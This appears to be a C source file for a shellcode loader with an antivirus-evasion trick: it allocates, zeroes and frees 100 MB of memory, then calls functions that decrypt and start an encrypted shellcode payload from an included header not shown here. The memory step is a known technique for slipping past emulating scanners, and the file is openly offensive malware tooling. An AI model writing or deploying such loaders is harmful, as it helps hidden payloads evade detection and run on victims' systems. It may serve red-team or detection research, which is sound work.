#include <stddef.h> //For NULL declaration
#include <stdlib.h> //For malloc
#include <string.h> //For memset
#include "..\payload_encrypted\payload.h"

#define TOO_MUCH_MEM 100000000

int main(){
    char * memdmp = NULL;
    //Allocate 100mb of memmory
    memdmp = (char *)malloc(TOO_MUCH_MEM);
    if(memdmp!=NULL){
        memset(memdmp,00, TOO_MUCH_MEM);
        free(memdmp);
        
        decryptShellCode();
        startShellCode(); 
    }
    return 0;
}